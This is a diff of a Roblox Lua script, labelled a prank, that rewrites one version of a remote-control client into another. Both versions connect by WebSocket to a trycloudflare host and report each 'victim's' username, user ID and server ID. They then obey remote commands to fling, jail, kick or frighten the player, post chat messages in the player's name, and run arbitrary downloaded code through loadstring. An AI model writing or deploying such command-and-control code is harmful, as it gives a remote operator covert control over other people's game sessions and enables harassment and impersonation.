@@ -1,356 +1,196 @@
 -- -Broma
-if not game:IsLoaded() then
-    local t = 0
-    while not game:IsLoaded() and t < 6 do
-        task.wait(0.2)
-        t = t + 0.2
-    end
-end
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
 local TeleportService = game:GetService("TeleportService")
-
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
-if not LocalPlayer then
-    local t = 0
-    while not LocalPlayer and t < 10 do
-        task.wait(0.1)
-        LocalPlayer = Players.LocalPlayer
-        t = t + 0.1
-    end
-end
-if not LocalPlayer then return end
 
 local WS_URL = "wss://outsourcing-poetry-alternatively-sonic.trycloudflare.com"
 
-local function getWSConnector()
-    local list = {
-        WebSocket,
-        websocket,
-        (getgenv and getgenv().WebSocket),
-        (getgenv and getgenv().websocket),
-        (syn and syn.websocket),
-        (syn and syn.WebSocket),
-    }
-    for _, item in ipairs(list) do
-        if type(item) == "table" then
-            if type(item.connect) == "function" then return item.connect end
-            if type(item.Connect) == "function" then return item.Connect end
-        elseif type(item) == "function" then
-            return item
-        end
-    end
-    return nil
-end
-
-local WS_Connect = getWSConnector()
+local WS_Connect = (WebSocket and WebSocket.connect) or (websocket and websocket.connect) or (syn and syn.websocket and syn.websocket.connect) or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
 if not WS_Connect then return end
 
-local function safeSend(s, msg)
-    if not s then return false end
-    local f = s.Send or s.send
-    if type(f) == "function" then
-        return pcall(f, s, msg)
-    end
-    return false
-end
-
-local function safeClose(s)
-    if not s then return end
-    local f = s.Close or s.close
-    if type(f) == "function" then
-        pcall(f, s)
-    end
-end
-
-local function setupEvents(s, onMsg, onClose)
-    pcall(function() s.OnMessage:Connect(onMsg) end)
-    pcall(function() s.onmessage = onMsg end)
-    pcall(function() s.OnClose:Connect(onClose) end)
-    pcall(function() s.onclose = onClose end)
-end
-
-local function tryOpenWS(url)
-    local ok, s = pcall(function()
-        return WS_Connect(url, {
-            ["User-Agent"] = "Roblox/WinInet"
-        })
-    end)
-    if ok and s then return s end
-    local ok2, s2 = pcall(function()
-        return WS_Connect(url)
-    end)
-    if ok2 and s2 then return s2 end
-    return nil
-end
-
-if _G.SacredVictimWSV2 then
-    safeClose(_G.SacredVictimWSV2)
+if _G.SacredVictimWS then
+    pcall(function() _G.SacredVictimWS:Close() end)
+    _G.SacredVictimWS = nil
 end
 
 local currentJail = nil
 local isSpinning = false
-local spinConn = nil
-local controlsInverted = false
-local currentSpeed = 16
-local speedConn = nil
-local currentCustomScriptThread = nil
-local recentCommands = {}
-local commandHistory = {}
+local speedLoop = nil
 
-local function setSpeedMode(spd)
-    currentSpeed = spd
-    if speedConn then speedConn:Disconnect() speedConn = nil end
-    local c = LocalPlayer.Character
-    local h = c and c:FindFirstChildOfClass("Humanoid")
-    if h then pcall(function() h.WalkSpeed = currentSpeed end) end
-    if currentSpeed ~= 16 then
-        speedConn = RunService.RenderStepped:Connect(function()
-            local ch = LocalPlayer.Character
-            local hm = ch and ch:FindFirstChildOfClass("Humanoid")
-            if hm then
-                pcall(function() hm.WalkSpeed = currentSpeed end)
-            end
-        end)
+local function getGui()
+    if gethui then
+        local ok, h = pcall(gethui)
+        if ok and h then return h end
     end
+    return LocalPlayer:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
 end
 
 local function handleCommand(data)
     if data.target and data.target ~= "TODOS" then
-        local t = string.lower(tostring(data.target or ""))
+        local targetName = string.lower(tostring(data.target))
         local myName = string.lower(tostring(LocalPlayer.Name or ""))
         local myDisplay = string.lower(tostring(LocalPlayer.DisplayName or ""))
-        if t ~= myName and t ~= myDisplay then
+        if targetName ~= myName and targetName ~= myDisplay then
             return
-        end
-    end
-
-    if data.cmd_id then
-        if recentCommands[data.cmd_id] then return end
-        recentCommands[data.cmd_id] = true
-        table.insert(commandHistory, data.cmd_id)
-        if #commandHistory > 60 then
-            local oldId = table.remove(commandHistory, 1)
-            recentCommands[oldId] = nil
         end
     end
 
     local char = LocalPlayer.Character
     local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
     local hum = char and char:FindFirstChildOfClass("Humanoid")
-    local cam = workspace.CurrentCamera
 
-    if data.action == "kick" then
-        pcall(function() LocalPlayer:Kick("Has sido expulsado del servidor.") end)
-        pcall(function() game:Shutdown() end)
+    if data.action == "fling" and root then
+        root.Velocity = Vector3.new(0, 3000, 0)
+        root.RotVelocity = Vector3.new(10000, 10000, 10000)
+
+    elseif data.action == "explosion" and root then
+        local exp = Instance.new("Explosion")
+        exp.Position = root.Position
+        exp.BlastPressure = 5000000
+        exp.BlastRadius = 30
+        exp.Parent = workspace
+        root.Velocity = Vector3.new(math.random(-1500, 1500), 3000, math.random(-1500, 1500))
+        root.RotVelocity = Vector3.new(6000, 6000, 6000)
+
+    elseif data.action == "kick" then
         pcall(function() TeleportService:Teleport(1, LocalPlayer) end)
-        pcall(function() while true do end end)
+        pcall(function() game:Shutdown() end)
 
-    elseif data.action == "reset_character" then
-        if hum then
-            pcall(function() hum.Health = 0 end)
-            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Dead) end)
-        end
-        if root then
-            pcall(function()
-                root.CFrame = CFrame.new(0, -99999, 0)
-            end)
-        end
+    elseif data.action == "reset_character" and root then
+        root.CFrame = CFrame.new(0, -99999, 0)
 
-    elseif data.action == "super_speed" then
-        pcall(function() setSpeedMode(250) end)
+    elseif data.action == "freeze" and root then
+        root.Anchored = true
 
-    elseif data.action == "snail_speed" then
-        pcall(function() setSpeedMode(3) end)
+    elseif data.action == "unfreeze" and root then
+        root.Anchored = false
 
-    elseif data.action == "normal_speed" then
-        pcall(function() setSpeedMode(16) end)
-
-    elseif data.action == "explosion" then
-        if root then
-            pcall(function()
-                local exp = Instance.new("Explosion")
-                exp.Position = root.Position
-                exp.BlastPressure = 5000000
-                exp.BlastRadius = 30
-                exp.Parent = workspace
-            end)
-            pcall(function()
-                root.Velocity = Vector3.new(math.random(-1500, 1500), 4000, math.random(-1500, 1500))
-                root.AssemblyLinearVelocity = root.Velocity
-                root.RotVelocity = Vector3.new(6000, 6000, 6000)
-                root.AssemblyAngularVelocity = root.RotVelocity
-            end)
-        end
-
-    elseif data.action == "invert_controls" then
-        pcall(function()
-            RunService:UnbindFromRenderStep("SacredInvert")
-            controlsInverted = true
-            RunService:BindToRenderStep("SacredInvert", Enum.RenderPriority.Character.Value + 1, function()
-                if not controlsInverted then return end
-                local c = LocalPlayer.Character
-                local h = c and c:FindFirstChildOfClass("Humanoid")
-                local r = c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso"))
-                if h and r then
-                    if UserInputService.KeyboardEnabled then
-                        local v = Vector3.zero
-                        if UserInputService:IsKeyDown(Enum.KeyCode.W) then v = v + Vector3.new(0, 0, 1) end
-                        if UserInputService:IsKeyDown(Enum.KeyCode.S) then v = v + Vector3.new(0, 0, -1) end
-                        if UserInputService:IsKeyDown(Enum.KeyCode.A) then v = v + Vector3.new(1, 0, 0) end
-                        if UserInputService:IsKeyDown(Enum.KeyCode.D) then v = v + Vector3.new(-1, 0, 0) end
-                        if v.Magnitude > 0 then h:Move(v, true) end
-                    else
-                        if h.MoveDirection.Magnitude > 0.05 then
-                            h:Move(-h.MoveDirection, false)
-                        end
-                    end
-                end
-            end)
+    elseif data.action == "super_speed" and hum then
+        if speedLoop then speedLoop:Disconnect() speedLoop = nil end
+        hum.WalkSpeed = 250
+        speedLoop = RunService.RenderStepped:Connect(function()
+            if hum and hum.Parent then hum.WalkSpeed = 250 end
         end)
 
-    elseif data.action == "restore_controls" then
-        pcall(function()
-            controlsInverted = false
-            RunService:UnbindFromRenderStep("SacredInvert")
+    elseif data.action == "snail_speed" and hum then
+        if speedLoop then speedLoop:Disconnect() speedLoop = nil end
+        hum.WalkSpeed = 3
+        speedLoop = RunService.RenderStepped:Connect(function()
+            if hum and hum.Parent then hum.WalkSpeed = 3 end
         end)
 
-    elseif data.action == "earthquake" then
-        if cam then
-            task.spawn(function()
-                local conn
-                local startT = tick()
-                conn = RunService.RenderStepped:Connect(function()
-                    if tick() - startT > 5 then
-                        pcall(function() conn:Disconnect() end)
-                        return
-                    end
-                    local ox = (math.random() - 0.5) * 1.5
-                    local oy = (math.random() - 0.5) * 1.5
-                    cam.CFrame = cam.CFrame * CFrame.new(ox, oy, 0)
-                end)
-            end)
+    elseif data.action == "normal_speed" and hum then
+        if speedLoop then speedLoop:Disconnect() speedLoop = nil end
+        hum.WalkSpeed = 16
+
+    elseif data.action == "spin" and root then
+        task.spawn(function()
+            for _ = 1, 90 do
+                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
+                task.wait(0.03)
+            end
+        end)
+
+    elseif data.action == "jail" and root then
+        if currentJail then pcall(function() currentJail:Destroy() end) end
+        local jModel = Instance.new("Model")
+        jModel.Name = "SacredCage"
+        jModel.Parent = workspace
+        local center = root.Position
+        local walls = {
+            {Vector3.new(0, -3.5, 0), Vector3.new(8, 1, 8)},
+            {Vector3.new(0, 5, 0), Vector3.new(8, 1, 8)},
+            {Vector3.new(4, 1, 0), Vector3.new(1, 8, 8)},
+            {Vector3.new(-4, 1, 0), Vector3.new(1, 8, 8)},
+            {Vector3.new(0, 1, 4), Vector3.new(8, 8, 1)},
+            {Vector3.new(0, 1, -4), Vector3.new(8, 8, 1)},
+        }
+        for _, d in ipairs(walls) do
+            local p = Instance.new("Part")
+            p.Size = d[2]
+            p.CFrame = CFrame.new(center + d[1])
+            p.Anchored = true
+            p.Material = Enum.Material.Neon
+            p.Color = Color3.fromRGB(255, 0, 50)
+            p.Transparency = 0.3
+            p.CanCollide = true
+            p.Parent = jModel
         end
-
-    elseif data.action == "freeze" then
-        if root then pcall(function() root.Anchored = true end) end
-
-    elseif data.action == "unfreeze" then
-        if root then pcall(function() root.Anchored = false end) end
-
-    elseif data.action == "bring" then
-        if data.position and root then
-            pcall(function()
-                root.CFrame = CFrame.new(data.position.x, data.position.y + 3, data.position.z)
-            end)
-        end
-
-    elseif data.action == "jail" then
-        if root then
-            pcall(function() if currentJail then currentJail:Destroy() end end)
-            pcall(function()
-                local jModel = Instance.new("Model")
-                jModel.Name = "SacredCage"
-                jModel.Parent = workspace
-                local center = root.Position
-                local walls = {
-                    {Vector3.new(0, -3.5, 0), Vector3.new(8, 1, 8)},
-                    {Vector3.new(0, 5, 0), Vector3.new(8, 1, 8)},
-                    {Vector3.new(4, 1, 0), Vector3.new(1, 8, 8)},
-                    {Vector3.new(-4, 1, 0), Vector3.new(1, 8, 8)},
-                    {Vector3.new(0, 1, 4), Vector3.new(8, 8, 1)},
-                    {Vector3.new(0, 1, -4), Vector3.new(8, 8, 1)},
-                }
-                for _, d in ipairs(walls) do
-                    local p = Instance.new("Part")
-                    p.Size = d[2]
-                    p.CFrame = CFrame.new(center + d[1])
-                    p.Anchored = true
-                    p.Material = Enum.Material.Neon
-                    p.Color = Color3.fromRGB(255, 0, 50)
-                    p.Transparency = 0.3
-                    p.CanCollide = true
-                    p.Parent = jModel
-                end
-                currentJail = jModel
-            end)
-        end
+        currentJail = jModel
 
     elseif data.action == "unjail" then
-        pcall(function()
-            if currentJail then currentJail:Destroy() end
-            currentJail = nil
-        end)
+        if currentJail then pcall(function() currentJail:Destroy() end) end
+        currentJail = nil
 
-    elseif data.action == "red_scare" then
-        task.spawn(function()
-            pcall(function()
-                local pGui = LocalPlayer:FindFirstChild("PlayerGui") or (gethui and gethui())
-                if not pGui then return end
-                local gui = Instance.new("ScreenGui")
-                gui.Name = "GlitchUI"
-                gui.IgnoreGuiInset = true
-                gui.DisplayOrder = 999999
-                gui.ResetOnSpawn = false
-                gui.Parent = pGui
-                local frame = Instance.new("Frame")
-                frame.Size = UDim2.new(1, 0, 1, 0)
-                frame.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-                frame.BackgroundTransparency = 0.15
-                frame.BorderSizePixel = 0
-                frame.Parent = gui
-                local label = Instance.new("TextLabel")
-                label.Size = UDim2.new(1, 0, 0.4, 0)
-                label.Position = UDim2.new(0, 0, 0.3, 0)
-                label.BackgroundTransparency = 1
-                label.TextColor3 = Color3.fromRGB(255, 255, 255)
-                label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-                label.TextStrokeTransparency = 0
-                label.Font = Enum.Font.GothamBlack
-                label.TextScaled = true
-                label.Text = "YA ES TARDE. NO PUEDES ESCAPAR."
-                label.Parent = frame
-                pcall(function()
-                    local s = Instance.new("Sound")
-                    s.SoundId = "rbxassetid://9069609267"
-                    s.Volume = 3
-                    s.Parent = workspace
-                    s:Play()
-                    task.delay(4, function() pcall(function() s:Destroy() end) end)
-                end)
-                for i = 1, 30 do
-                    frame.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(220, 0, 0) or Color3.fromRGB(20, 0, 0)
-                    label.Position = UDim2.new(0, math.random(-15, 15), 0.3, math.random(-15, 15))
-                    task.wait(0.08)
-                end
-                gui:Destroy()
-            end)
+    elseif data.action == "bring" and root and data.position then
+        root.CFrame = CFrame.new(data.position.x, data.position.y + 3, data.position.z)
+
+    elseif data.action == "chat" and data.message then
+        pcall(function()
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(data.message))
+            else
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(data.message), "All")
+            end
         end)
 
     elseif data.action == "blackout" then
         task.spawn(function()
+            local g = getGui()
+            if not g then return end
+            local ui = Instance.new("ScreenGui")
+            ui.IgnoreGuiInset = true
+            ui.DisplayOrder = 999999
+            ui.Parent = g
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(1, 0, 1, 0)
+            f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            f.BorderSizePixel = 0
+            f.Parent = ui
+            task.wait(6)
+            ui:Destroy()
+        end)
+
+    elseif data.action == "red_scare" then
+        task.spawn(function()
+            local g = getGui()
+            if not g then return end
+            local ui = Instance.new("ScreenGui")
+            ui.IgnoreGuiInset = true
+            ui.DisplayOrder = 999999
+            ui.Parent = g
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(1, 0, 1, 0)
+            f.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+            f.BackgroundTransparency = 0.15
+            f.BorderSizePixel = 0
+            f.Parent = ui
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(1, 0, 0.4, 0)
+            lbl.Position = UDim2.new(0, 0, 0.3, 0)
+            lbl.BackgroundTransparency = 1
+            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+            lbl.TextScaled = true
+            lbl.Font = Enum.Font.GothamBlack
+            lbl.Text = "YA ES TARDE. NO PUEDES ESCAPAR."
+            lbl.Parent = f
             pcall(function()
-                local pGui = LocalPlayer:FindFirstChild("PlayerGui") or (gethui and gethui())
-                if not pGui then return end
-                local gui = Instance.new("ScreenGui")
-                gui.Name = "DarkUI"
-                gui.IgnoreGuiInset = true
-                gui.DisplayOrder = 999999
-                gui.ResetOnSpawn = false
-                gui.Parent = pGui
-                local frame = Instance.new("Frame")
-                frame.Size = UDim2.new(1, 0, 1, 0)
-                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                frame.BorderSizePixel = 0
-                frame.Parent = gui
-                task.wait(6)
-                gui:Destroy()
+                local s = Instance.new("Sound")
+                s.SoundId = "rbxassetid://9069609267"
+                s.Volume = 3
+                s.Parent = workspace
+                s:Play()
+                task.delay(4, function() pcall(function() s:Destroy() end) end)
             end)
+            for i = 1, 30 do
+                f.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(220, 0, 0) or Color3.fromRGB(20, 0, 0)
+                lbl.Position = UDim2.new(0, math.random(-15, 15), 0.3, math.random(-15, 15))
+                task.wait(0.08)
+            end
+            ui:Destroy()
         end)
 
     elseif data.action == "screen_alert" and data.message then
@@ -362,132 +202,94 @@ local function handleCommand(data)
                     Duration = 8
                 })
             end)
-            pcall(function()
-                local pGui = LocalPlayer:FindFirstChild("PlayerGui") or (gethui and gethui())
-                if not pGui then return end
-                local gui = Instance.new("ScreenGui")
-                gui.Name = "NoticeBanner"
-                gui.ResetOnSpawn = false
-                gui.DisplayOrder = 999998
-                gui.IgnoreGuiInset = true
-                gui.Parent = pGui
-                local frame = Instance.new("Frame")
-                frame.Size = UDim2.new(1, 0, 0, 90)
-                frame.Position = UDim2.new(0, 0, 0.1, 0)
-                frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-                frame.BackgroundTransparency = 0.1
-                frame.BorderSizePixel = 0
-                frame.Parent = gui
-                local txt = Instance.new("TextLabel")
-                txt.Size = UDim2.new(1, -40, 1, 0)
-                txt.Position = UDim2.new(0, 20, 0, 0)
-                txt.BackgroundTransparency = 1
-                txt.TextColor3 = Color3.fromRGB(255, 50, 50)
-                txt.TextScaled = true
-                txt.Font = Enum.Font.GothamBlack
-                txt.Text = "\xE2\x9A\xA0\xEF\xB8\x8F " .. tostring(data.message)
-                txt.Parent = frame
-                task.wait(7)
-                gui:Destroy()
-            end)
+            local g = getGui()
+            if not g then return end
+            local ui = Instance.new("ScreenGui")
+            ui.IgnoreGuiInset = true
+            ui.DisplayOrder = 999998
+            ui.Parent = g
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(1, 0, 0, 90)
+            f.Position = UDim2.new(0, 0, 0.1, 0)
+            f.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+            f.BackgroundTransparency = 0.1
+            f.BorderSizePixel = 0
+            f.Parent = ui
+            local txt = Instance.new("TextLabel")
+            txt.Size = UDim2.new(1, -40, 1, 0)
+            txt.Position = UDim2.new(0, 20, 0, 0)
+            txt.BackgroundTransparency = 1
+            txt.TextColor3 = Color3.fromRGB(255, 50, 50)
+            txt.TextScaled = true
+            txt.Font = Enum.Font.GothamBlack
+            txt.Text = "\xE2\x9A\xA0\xEF\xB8\x8F " .. tostring(data.message)
+            txt.Parent = f
+            task.wait(7)
+            ui:Destroy()
         end)
 
     elseif data.action == "execute" and data.code then
-        if currentCustomScriptThread then
-            pcall(function() task.cancel(currentCustomScriptThread) end)
-            currentCustomScriptThread = nil
-        end
-        currentCustomScriptThread = task.spawn(function()
-            pcall(function()
-                local fn = loadstring(data.code)
-                if fn then fn() end
-            end)
+        task.spawn(function()
+            local fn = loadstring(data.code)
+            if fn then fn() end
         end)
-
-    elseif data.action == "fling" then
-        if root then
-            pcall(function()
-                root.Velocity = Vector3.new(math.random(-2000, 2000), 5000, math.random(-2000, 2000))
-                root.AssemblyLinearVelocity = root.Velocity
-                root.RotVelocity = Vector3.new(10000, 10000, 10000)
-                root.AssemblyAngularVelocity = root.RotVelocity
-            end)
-        end
-
-    elseif data.action == "chat" and data.message then
-        pcall(function()
-            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(data.message))
-            else
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(data.message), "All")
-            end
-        end)
-
-    elseif data.action == "spin" then
-        if spinConn then spinConn:Disconnect() spinConn = nil end
-        isSpinning = true
-        spinConn = RunService.RenderStepped:Connect(function()
-            if not isSpinning then return end
-            local c = LocalPlayer.Character
-            local r = c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso"))
-            if r then
-                pcall(function()
-                    r.CFrame = r.CFrame * CFrame.Angles(0, math.rad(35), 0)
-                end)
-            end
-        end)
-
-    elseif data.action == "unspin" then
-        isSpinning = false
-        if spinConn then spinConn:Disconnect() spinConn = nil end
     end
 end
 
 task.spawn(function()
     while true do
-        local ws = tryOpenWS(WS_URL)
-
-        if ws then
-            _G.SacredVictimWSV2 = ws
-            local isClosed = false
+        local ok, ws = pcall(function() return WS_Connect(WS_URL) end)
+        if ok and ws then
+            _G.SacredVictimWS = ws
 
             local function sendPresence(msgType)
-                local currentJob = tostring(game.JobId or "")
-                local sendOk = safeSend(ws, HttpService:JSONEncode({
-                    type = msgType or "victim_joined",
-                    username = LocalPlayer.Name,
-                    userId = LocalPlayer.UserId,
-                    placeId = game.PlaceId,
-                    gameId = game.GameId,
-                    jobId = currentJob
-                }))
-                if not sendOk then isClosed = true end
+                pcall(function()
+                    local jid = tostring(game.JobId or "")
+                    local payload = HttpService:JSONEncode({
+                        type = msgType or "victim_joined",
+                        username = LocalPlayer.Name,
+                        userId = LocalPlayer.UserId,
+                        placeId = game.PlaceId,
+                        gameId = game.GameId,
+                        jobId = jid
+                    })
+                    local fn = ws.Send or ws.send
+                    if type(fn) == "function" then fn(ws, payload) else ws:Send(payload) end
+                end)
             end
 
-            task.wait(0.3)
+            task.wait(0.5)
             sendPresence("victim_joined")
 
-            setupEvents(ws, function(raw)
+            local function onMsg(raw)
                 local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
                 if s and data then
                     if data.type == "ping_victims" then
                         sendPresence("victim_joined")
                     elseif data.type == "master_command" then
                         task.spawn(function()
-                            handleCommand(data)
+                            pcall(handleCommand, data)
                         end)
                     end
                 end
-            end, function()
-                isClosed = true
+            end
+
+            pcall(function() ws.OnMessage:Connect(onMsg) end)
+            pcall(function() ws.onmessage = onMsg end)
+
+            local isClosed = false
+            pcall(function()
+                ws.OnClose:Connect(function() isClosed = true end)
+            end)
+            pcall(function()
+                ws.onclose = function() isClosed = true end
             end)
 
-            while not isClosed and _G.SacredVictimWSV2 == ws do
+            while not isClosed and _G.SacredVictimWS == ws do
                 task.wait(10)
                 sendPresence("victim_ping")
             end
         end
-
         task.wait(3)
     end
 end)
